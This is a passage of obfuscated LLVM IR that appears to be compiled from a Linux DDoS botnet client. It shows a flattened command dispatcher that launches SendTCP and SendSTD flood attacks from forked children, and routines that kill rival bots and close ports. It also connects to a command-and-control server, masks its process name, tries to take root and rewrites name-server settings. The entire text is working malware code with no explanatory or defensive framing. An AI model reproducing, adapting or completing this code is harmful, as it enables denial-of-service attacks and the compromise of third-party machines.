  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 6
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #9
  store i32 -875481834, i32* %switchVar
  store i32 %390, i32* %.reg2mem4
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  store i32 -875481834, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %22, align 4
  %393 = load i32, i32* %3, align 4
  %394 = icmp sgt i32 %393, 5
  %395 = select i1 %394, i32 1357303887, i32 2101906746
  store i32 %395, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i8**, i8*** %4, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 5
  %399 = load i8*, i8** %398, align 8
  %400 = call i32 @atoi(i8* %399) #9
  store i32 -207029674, i32* %switchVar
  store i32 %400, i32* %.reg2mem6
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  store i32 -207029674, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %23, align 4
  store i32 32, i32* %24, align 4
  %403 = load i8*, i8** %18, align 8
  %404 = call i8* @strstr(i8* %403, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %405 = icmp ne i8* %404, null
  %406 = select i1 %405, i32 1426723691, i32 583024968
  store i32 %406, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = load i8*, i8** %18, align 8
  %409 = call i8* @strtok(i8* %408, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %409, i8** %25, align 8
  store i32 -24155700, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i8*, i8** %25, align 8
  %412 = icmp ne i8* %411, null
  %413 = select i1 %412, i32 -909830673, i32 2064377113
  store i32 %413, i32* %switchVar
  br label %loopEnd

; <label>:414:                                    ; preds = %loopEntry
  %415 = call i32 @listFork()
  %416 = icmp ne i32 %415, 0
  %417 = select i1 %416, i32 -1662493175, i32 2134970254
  store i32 %417, i32* %switchVar
  br label %loopEnd

; <label>:418:                                    ; preds = %loopEntry
  %419 = load i8*, i8** %25, align 8
  %420 = load i32, i32* %19, align 4
  %421 = load i32, i32* %20, align 4
  %422 = load i8*, i8** %21, align 8
  %423 = load i32, i32* %23, align 4
  %424 = load i32, i32* %22, align 4
  %425 = load i32, i32* %24, align 4
  call void @SendTCP(i8* %419, i32 %420, i32 %421, i8* %422, i32 %423, i32 %424, i32 %425)
  call void @_exit(i32 0) #11
  unreachable

; <label>:426:                                    ; preds = %loopEntry
  %427 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %427, i8** %25, align 8
  store i32 -24155700, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  store i32 -1673518874, i32* %switchVar
  br label %loopEnd

; <label>:429:                                    ; preds = %loopEntry
  %430 = call i32 @listFork()
  %431 = icmp ne i32 %430, 0
  %432 = select i1 %431, i32 -1891159667, i32 -1151789594
  store i32 %432, i32* %switchVar
  br label %loopEnd

; <label>:433:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i8*, i8** %18, align 8
  %436 = load i32, i32* %19, align 4
  %437 = load i32, i32* %20, align 4
  %438 = load i8*, i8** %21, align 8
  %439 = load i32, i32* %23, align 4
  %440 = load i32, i32* %22, align 4
  %441 = load i32, i32* %24, align 4
  call void @SendTCP(i8* %435, i32 %436, i32 %437, i8* %438, i32 %439, i32 %440, i32 %441)
  call void @_exit(i32 0) #11
  unreachable

; <label>:442:                                    ; preds = %loopEntry
  store i32 -1779248960, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 0
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @strcmp(i8* %446, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.315, i32 0, i32 0)) #9
  %448 = icmp ne i32 %447, 0
  %449 = select i1 %448, i32 -357716732, i32 -860049600
  store i32 %449, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %3, align 4
  %452 = icmp slt i32 %451, 4
  %453 = select i1 %452, i32 880812261, i32 -1040496169
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i8**, i8*** %4, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 2
  %457 = load i8*, i8** %456, align 8
  %458 = call i32 @atoi(i8* %457) #9
  %459 = icmp slt i32 %458, 1
  %460 = select i1 %459, i32 880812261, i32 -871583833
  store i32 %460, i32* %switchVar
  br label %loopEnd

; <label>:461:                                    ; preds = %loopEntry
  %462 = load i8**, i8*** %4, align 8
  %463 = getelementptr inbounds i8*, i8** %462, i64 3
  %464 = load i8*, i8** %463, align 8
  %465 = call i32 @atoi(i8* %464) #9
  %466 = icmp slt i32 %465, 1
  %467 = select i1 %466, i32 880812261, i32 -1520970950
  store i32 %467, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = load i8**, i8*** %4, align 8
  %471 = getelementptr inbounds i8*, i8** %470, i64 1
  %472 = load i8*, i8** %471, align 8
  store i8* %472, i8** %26, align 8
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 2
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @atoi(i8* %475) #9
  store i32 %476, i32* %27, align 4
  %477 = load i8**, i8*** %4, align 8
  %478 = getelementptr inbounds i8*, i8** %477, i64 3
  %479 = load i8*, i8** %478, align 8
  %480 = call i32 @atoi(i8* %479) #9
  store i32 %480, i32* %28, align 4
  %481 = load i8*, i8** %26, align 8
  %482 = call i8* @strstr(i8* %481, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %483 = icmp ne i8* %482, null
  %484 = select i1 %483, i32 112341942, i32 -191339001
  store i32 %484, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i8*, i8** %26, align 8
  %487 = call i8* @strtok(i8* %486, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %487, i8** %29, align 8
  store i32 -1664722865, i32* %switchVar
  br label %loopEnd

; <label>:488:                                    ; preds = %loopEntry
  %489 = load i8*, i8** %29, align 8
  %490 = icmp ne i8* %489, null
  %491 = select i1 %490, i32 409472675, i32 -638772049
  store i32 %491, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = call i32 @listFork()
  %494 = icmp ne i32 %493, 0
  %495 = select i1 %494, i32 1208441849, i32 -1739971781
  store i32 %495, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %497 = load i8*, i8** %29, align 8
  %498 = load i32, i32* %27, align 4
  %499 = load i32, i32* %28, align 4
  call void @SendSTD(i8* %497, i32 %498, i32 %499)
  call void @_exit(i32 0) #11
  unreachable

; <label>:500:                                    ; preds = %loopEntry
  %501 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %501, i8** %29, align 8
  store i32 -1664722865, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  store i32 1422937177, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = call i32 @listFork()
  %505 = icmp ne i32 %504, 0
  %506 = select i1 %505, i32 1005736290, i32 -1451360468
  store i32 %506, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i8*, i8** %26, align 8
  %510 = load i32, i32* %27, align 4
  %511 = load i32, i32* %28, align 4
  call void @SendSTD(i8* %509, i32 %510, i32 %511)
  call void @_exit(i32 0) #11
  unreachable

; <label>:512:                                    ; preds = %loopEntry
  store i32 -357716732, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i8**, i8*** %4, align 8
  %515 = getelementptr inbounds i8*, i8** %514, i64 0
  %516 = load i8*, i8** %515, align 8
  %517 = call i32 @strcmp(i8* %516, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.316, i32 0, i32 0)) #9
  %518 = icmp ne i32 %517, 0
  %519 = select i1 %518, i32 1011951702, i32 -1956987039
  store i32 %519, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  call void @bot_killer()
  call void @port_closer()
  store i32 1011951702, i32* %switchVar
  br label %loopEnd

; <label>:521:                                    ; preds = %loopEntry
  %522 = load i8**, i8*** %4, align 8
  %523 = getelementptr inbounds i8*, i8** %522, i64 0
  %524 = load i8*, i8** %523, align 8
  %525 = call i32 @strcmp(i8* %524, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0)) #9
  %526 = icmp ne i32 %525, 0
  %527 = select i1 %526, i32 743770084, i32 1738716214
  store i32 %527, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  store i32 -6309486, i32* %switchVar
  br label %loopEnd

; <label>:529:                                    ; preds = %loopEntry
  %530 = load i64, i64* %31, align 8
  %531 = load i64, i64* @numpids, align 8
  %532 = icmp ult i64 %530, %531
  %533 = select i1 %532, i32 1349913524, i32 1577010847
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load i32*, i32** @pids, align 8
  %536 = load i64, i64* %31, align 8
  %537 = getelementptr inbounds i32, i32* %535, i64 %536
  %538 = load i32, i32* %537, align 4
  %539 = icmp ne i32 %538, 0
  %540 = select i1 %539, i32 -764251851, i32 -2090728146
  store i32 %540, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  %542 = load i32*, i32** @pids, align 8
  %543 = load i64, i64* %31, align 8
  %544 = getelementptr inbounds i32, i32* %542, i64 %543
  %545 = load i32, i32* %544, align 4
  %546 = call i32 @getpid() #5
  %547 = icmp ne i32 %545, %546
  %548 = select i1 %547, i32 -743840768, i32 -2090728146
  store i32 %548, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = load i32*, i32** @pids, align 8
  %551 = load i64, i64* %31, align 8
  %552 = getelementptr inbounds i32, i32* %550, i64 %551
  %553 = load i32, i32* %552, align 4
  %554 = call i32 @kill(i32 %553, i32 9) #5
  %555 = load i32, i32* %30, align 4
  %556 = add nsw i32 %555, 1
  store i32 %556, i32* %30, align 4
  store i32 -2090728146, i32* %switchVar
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  store i32 -2005087427, i32* %switchVar
  br label %loopEnd

; <label>:558:                                    ; preds = %loopEntry
  %559 = load i64, i64* %31, align 8
  %560 = add i64 %559, 1
  store i64 %560, i64* %31, align 8
  store i32 -6309486, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  %562 = load i32, i32* %30, align 4
  %563 = icmp sgt i32 %562, 0
  %564 = select i1 %563, i32 -2029395316, i32 -1215762256
  store i32 %564, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  store i32 -804920297, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  store i32 -804920297, i32* %switchVar
  br label %loopEnd

; <label>:567:                                    ; preds = %loopEntry
  store i32 743770084, i32* %switchVar
  br label %loopEnd

; <label>:568:                                    ; preds = %loopEntry
  %569 = load i8**, i8*** %4, align 8
  %570 = getelementptr inbounds i8*, i8** %569, i64 0
  %571 = load i8*, i8** %570, align 8
  %572 = call i32 @strcmp(i8* %571, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.318, i32 0, i32 0)) #9
  %573 = icmp ne i32 %572, 0
  %574 = select i1 %573, i32 1457427420, i32 51445622
  store i32 %574, i32* %switchVar
  br label %loopEnd

; <label>:575:                                    ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:576:                                    ; preds = %loopEntry
  %577 = load i8**, i8*** %4, align 8
  %578 = getelementptr inbounds i8*, i8** %577, i64 0
  %579 = load i8*, i8** %578, align 8
  %580 = call i32 @strcmp(i8* %579, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.319, i32 0, i32 0)) #9
  %581 = icmp ne i32 %580, 0
  %582 = select i1 %581, i32 1814389672, i32 320025222
  store i32 %582, i32* %switchVar
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  call void @RemoveTempDirs()
  %584 = load i32, i32* @mainCommSock, align 4
  %585 = call i8* @getBuild()
  %586 = call i32 (i32, i8*, ...) @sockprintf(i32 %584, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.320, i32 0, i32 0), i8* %585)
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:587:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %583, %576, %568, %567, %566, %565, %561, %558, %557, %549, %541, %534, %529, %528, %521, %520, %513, %512, %507, %503, %502, %500, %492, %488, %485, %469, %468, %461, %454, %450, %443, %442, %433, %429, %428, %426, %414, %410, %407, %402, %401, %396, %392, %391, %386, %368, %367, %360, %356, %349, %345, %338, %331, %327, %320, %319, %311, %307, %306, %304, %293, %289, %286, %281, %280, %275, %256, %255, %248, %244, %237, %230, %223, %216, %212, %205, %181, %177, %176, %169, %162, %158, %151, %150, %149, %132, %129, %125, %118, %115, %114, %110, %103, %102, %99, %79, %78, %77, %76, %72, %70, %66, %65, %61, %60, %53, %46, %39, %38, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 512, i32 16, i1 false)
  %4 = load i32, i32* @mainCommSock, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 849666233, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 849666233, label %first
    i32 -1826191932, label %7
    i32 -900931375, label %10
    i32 -154189957, label %16
    i32 1752974960, label %17
    i32 1492964614, label %20
    i32 -96839313, label %34
    i32 -1685161005, label %35
    i32 -193327672, label %36
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 -1826191932, i32 -900931375
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  store i32 -900931375, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  %15 = select i1 %14, i32 -154189957, i32 1752974960
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 1492964614, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* @currentServer, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* @currentServer, align 4
  store i32 1492964614, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %22 = load i32, i32* @currentServer, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %23
  %25 = load i8*, i8** %24, align 8
  %26 = call i8* @strcpy(i8* %21, i8* %25) #5
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %27, i32* @mainCommSock, align 4
  %28 = load i32, i32* @mainCommSock, align 4
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %30 = load i32, i32* @port, align 4
  %31 = call i32 @connectTimeout(i32 %28, i8* %29, i32 %30, i32 30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 -1685161005, i32 -96839313
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -193327672, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -193327672, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %1, align 4
  ret i32 %37

loopEnd:                                          ; preds = %35, %34, %20, %17, %16, %10, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i32 0, i32 0), i32 0) #5
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -326052764, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -326052764, label %first
    i32 1493512811, label %9
    i32 1611031281, label %17
    i32 -740249155, label %18
    i32 973839548, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ne i32 %.reload, -1
  %8 = select i1 %7, i32 1493512811, i32 1611031281
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.322, i32 0, i32 0), i8** %2, align 8
  %10 = load i8*, i8** %2, align 8
  %11 = call i64 @strlen(i8* %10) #9
  store i64 %11, i64* %3, align 8
  %12 = load i16, i16* %1, align 2
  %13 = zext i16 %12 to i32
  %14 = load i8*, i8** %2, align 8
  %15 = load i64, i64* %3, align 8
  %16 = call i64 @write(i32 %13, i8* %14, i64 %15)
  store i32 -740249155, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 973839548, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i16, i16* %1, align 2
  %20 = zext i16 %19 to i32
  %21 = call i32 @close(i32 %20)
  store i32 973839548, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %18, %17, %9, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 4
  %switchVar = alloca i32
  store i32 -701403093, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -701403093, label %first
    i32 1558019320, label %49
    i32 2103304666, label %52
    i32 -1088000068, label %56
    i32 1071807664, label %60
    i32 -1273026637, label %61
    i32 -453107707, label %65
    i32 -1229995559, label %66
    i32 1208024931, label %67
    i32 -341848344, label %68
    i32 1696176528, label %69
    i32 806662853, label %74
    i32 1501189047, label %78
    i32 -2009136612, label %82
    i32 125908857, label %84
    i32 -1403010079, label %88
    i32 1919171354, label %94
    i32 -2082199218, label %95
    i32 897658997, label %101
    i32 620533529, label %110
    i32 -1040725732, label %113
    i32 1872853857, label %119
    i32 -449591633, label %130
    i32 -592258859, label %133
    i32 1270706983, label %146
    i32 1358798603, label %152
    i32 -1608333273, label %162
    i32 -413499305, label %165
    i32 1443261915, label %169
    i32 685874355, label %170
    i32 -1222491370, label %173
    i32 -356179235, label %183
    i32 1208705354, label %184
    i32 236699685, label %190
    i32 1766374169, label %191
    i32 -682087642, label %198
    i32 -947461840, label %201
    i32 1219974119, label %207
    i32 -1123867244, label %212
    i32 -774981912, label %214
    i32 2129226630, label %217
    i32 -300742790, label %223
    i32 -1778317062, label %224
    i32 -1266151365, label %233
    i32 -1313539872, label %243
    i32 -157974779, label %252
    i32 -551835209, label %254
    i32 1321953537, label %260
    i32 -1873801324, label %262
    i32 -370748066, label %268
    i32 -1877634011, label %273
    i32 712394891, label %275
    i32 -2031844488, label %278
    i32 1443440243, label %283
    i32 -1892181186, label %288
    i32 -1415992017, label %297
    i32 225928626, label %302
    i32 -1802700486, label %306
    i32 1509533436, label %312
    i32 -990622072, label %335
    i32 -334464311, label %337
    i32 -974694523, label %343
    i32 -20467335, label %344
    i32 753621283, label %349
    i32 -2039971263, label %354
    i32 -2004713495, label %357
    i32 -69885820, label %358
    i32 -845455367, label %359
    i32 -1435446377, label %360
    i32 450937577, label %361
    i32 810545520, label %362
    i32 -1124375814, label %363
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %47 = icmp ne i32 %.reload, 0
  %48 = select i1 %47, i32 1558019320, i32 2103304666
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %7, align 4
  %51 = call i32 @waitpid(i32 %50, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp ne i32 %53, 0
  %55 = select i1 %54, i32 1696176528, i32 -1088000068
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = call i32 @fork() #5
  store i32 %57, i32* %8, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 1071807664, i32 -1273026637
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %8, align 4
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 -1229995559, i32 -453107707
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1208024931, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 1208024931, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -341848344, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 810545520, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.323, i32 0, i32 0)) #5
  %71 = call i32 @setuid(i32 0) #5
  %72 = call i32 @seteuid(i32 0) #5
  %73 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  store i32 806662853, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = call i32 @fork() #5
  %76 = icmp eq i32 %75, 0
  %77 = select i1 %76, i32 1501189047, i32 450937577
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = call i32 @initConnection()
  %80 = icmp ne i32 %79, 0
  %81 = select i1 %80, i32 -2009136612, i32 125908857
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = call i32 @sleep(i32 5)
  store i32 806662853, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* @mainCommSock, align 4
  %86 = call i8* @getBuild()
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %85, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.324, i32 0, i32 0), i8* %86)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  call void @bot_killer()
  call void @port_closer()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 -1403010079, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* @mainCommSock, align 4
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %91 = call i32 @recvLine(i32 %89, i8* %90, i32 4096)
  store i32 %91, i32* %11, align 4
  %92 = icmp ne i32 %91, -1
  %93 = select i1 %92, i32 1919171354, i32 -1435446377
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 -2082199218, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %12, align 4
  %97 = sext i32 %96 to i64
  %98 = load i64, i64* @numpids, align 8
  %99 = icmp ult i64 %97, %98
  %100 = select i1 %99, i32 897658997, i32 -1222491370
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32*, i32** @pids, align 8
  %103 = load i32, i32* %12, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
